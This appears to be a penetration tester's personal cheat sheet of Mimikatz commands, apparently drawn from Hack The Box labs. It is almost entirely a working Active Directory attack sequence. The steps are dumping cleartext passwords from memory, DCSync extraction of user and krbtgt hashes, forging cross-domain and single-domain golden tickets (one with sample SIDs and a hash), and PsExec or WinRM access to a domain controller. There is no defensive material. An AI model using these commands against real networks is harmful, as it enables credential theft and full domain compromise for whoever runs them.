To start with mimikatz, run the debug mode to run commands properly:
	- privilege::debug
	- You should receive an OK response if you have the right permissions

- log nameoflog.log
	- This starts the logging functions so you can refer back to previous commands
- sekurlsa::logonpasswords
	- Shows all cleartext passwords stored on the victim
- lsadump::dcsync /user:DOMAIN\username
	- This will produce the NT hash of the user you have specified
- Golden Ticket attack can be used with MimiKatz which will be a Pass-The-Ticket attack aka ExtraSIDS attack
- kerberos::golden /user:"fake username" /domain:"victimDomain".LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /krbtgt:9d765b482771505cbe97411065964d5f /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt
- This was an example of a ticket I had used but command is simple
- /sid is for the child domain you are on, for example used in HTB Labs logistics.inlanefreight.local
- /krbtgt is for the child domain hash. Using the lsadump will produce the hash needed for this. 
- fake username can literally be whatever fake name you come up with, does not need to exist for Golden Tickets
- /sids is the Enterprise Admins group of the root domain, look at Trust Attacks for Windows to see how you can get the SID.
- For any generated tickets, you can run klist to see cached tickets to verify the ticket was created.
- After you verified the ticket, you can run the following command to see if it worked:
	- ls \\target-domain name\c$


Golden Ticket Attack

-The previous block was for a cross domain ticket attack, this will be from a WS to DC
-Things needed are domain name, domain sid, username to impersonate, and krbtgt's hash

- Use PowerView to get the domain sid:
	- Import-Module PowerView
	- Get-DomainSID
- Next, run the following:
	- lsadump::dcsync /user:krbtgt /domain:targeted.local
- Create your golden ticket:
	- kerberos::golden /domain:targeted.local /user:Administrator /sid:DomainSID /rc4:Hash NTLM that came from lsadump /ptt
	- Verify through klist that the ticket was created
	- Use WinRM or PsExec to connect to your ticket
	- Enter-PSSession DC01
	- PsExec.exe \\targetedDomain cmd.exe
	- Example: PsExec.exe \\DC01 cmd.exe
- ![[Pasted image 20230911143438.png]]
